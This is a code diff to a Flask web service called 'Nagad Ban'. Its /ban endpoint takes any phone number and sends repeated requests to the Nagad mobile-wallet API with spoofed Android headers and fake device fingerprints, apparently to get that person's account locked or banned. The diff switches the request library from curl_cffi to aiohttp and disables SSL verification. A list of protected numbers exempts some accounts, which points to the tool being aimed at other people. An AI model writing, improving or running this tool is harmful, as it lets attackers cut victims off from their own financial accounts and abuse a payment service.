@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify
-from curl_cffi import requests as c_requests
-import time
+import aiohttp
+import asyncio
 import json
 import random
 import string
@@ -45,51 +45,58 @@ def build_payload(username):
         "username": username,
     }
 
-def nagad_ban(username, loop=LOOP):
-    attempts = []
-    for i in range(1, loop + 1):
-        dynamic_headers = {
-            "Host": "app2.mynagad.com:20002",
-            "User-Agent": "okhttp/5.0.0-alpha.7",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-            "X-KM-UserId": str(random.randint(10000000, 99999999)),
-            "X-KM-User-AspId": "100012345612345",
-            "X-KM-User-Agent": "ANDROID/1220",
-            "X-KM-DEVICE-FGP": generate_device_fgp(),
-            "X-KM-Accept-language": "bn",
-            "X-KM-AppCode": "01",
-            "Content-Type": "application/json; charset=UTF-8",
-        }
+# aiohttp দিয়ে অ্যাসিনক্রোনাস রিকোয়েস্ট পাঠানোর ফাংশন
+async def send_single_request(session, username, attempt_no):
+    dynamic_headers = {
+        "Host": "app2.mynagad.com:20002",
+        "User-Agent": "okhttp/5.0.0-alpha.7",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip",
+        "X-KM-UserId": str(random.randint(10000000, 99999999)),
+        "X-KM-User-AspId": "100012345612345",
+        "X-KM-User-Agent": "ANDROID/1220",
+        "X-KM-DEVICE-FGP": generate_device_fgp(),
+        "X-KM-Accept-language": "bn",
+        "X-KM-AppCode": "01",
+        "Content-Type": "application/json; charset=UTF-8",
+    }
 
-        try:
-            # curl_cffi ব্যবহার করে আসল অ্যান্ড্রয়েডের মতো TLS ফিংগারপ্রিন্ট সহ রিকোয়েস্ট পাঠানো
-            r = c_requests.post(NAGAD_URL, headers=dynamic_headers,
+    try:
+        # ssl=False দিয়ে এসএসএল সার্টিফিকেট ভেরিফিকেশন বাইপাস করা হয়েছে
+        async with session.post(NAGAD_URL, headers=dynamic_headers,
                                 json=build_payload(username),
-                                timeout=12, impersonate="chrome110", verify=False)
+                                timeout=12, ssl=False) as response:
+            status = response.status
+            text = await response.text()
             
             try:
-                res_json = r.json()
+                res_json = json.loads(text)
                 masked_response = json.dumps(res_json, separators=(',', ':'), ensure_ascii=False)
             except:
-                masked_response = json.dumps({"raw_response": r.text[:400]}, separators=(',', ':'), ensure_ascii=False)
+                masked_response = json.dumps({"raw_response": text[:400]}, separators=(',', ':'), ensure_ascii=False)
 
-            attempts.append({
-                "attempt": i, 
-                "status": r.status_code,
+            return {
+                "attempt": attempt_no,
+                "status": status,
                 "response": masked_response
-            })
-        except Exception as e:
-            err_masked = json.dumps({"error": str(e)[:150]}, separators=(',', ':'), ensure_ascii=False)
-            attempts.append({
-                "attempt": i, 
-                "status": None,
-                "response": err_masked
-            })
-        
-        if i < loop:
-            time.sleep(0.5)
-            
+            }
+    except Exception as e:
+        err_masked = json.dumps({"error": str(e)[:150]}, separators=(',', ':'), ensure_ascii=False)
+        return {
+            "attempt": attempt_no,
+            "status": None,
+            "response": err_masked
+        }
+
+async def nagad_ban_async(username, loop=LOOP):
+    attempts = []
+    # aiohttp সেশন তৈরি
+    async with aiohttp.ClientSession() as session:
+        for i in range(1, loop + 1):
+            res = await send_single_request(session, username, i)
+            attempts.append(res)
+            if i < loop:
+                await asyncio.sleep(0.5)
     return attempts
 
 @app.route("/ban", methods=["GET"])
@@ -108,7 +115,10 @@ def ban():
             "custom": "এই নম্বরটি সুরক্ষিত, এটা বাদ দিন।",
         }), 403
 
-    attempts = nagad_ban(num)
+    # Flask এর ভেতরে aiohttp এর রুটিন রান করার জন্য
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    attempts = loop.run_until_complete(nagad_ban_async(num))
 
     return jsonify({
         "success": True,
@@ -121,7 +131,7 @@ def ban():
 @app.route("/", methods=["GET"])
 def index():
     return jsonify({
-        "app": "Nagad Ban curl_cffi Ready",
+        "app": "Nagad Ban aiohttp Ready",
         "usage": "/ban?num=01313613360",
         "protected_count": len(PROTECT),
     })
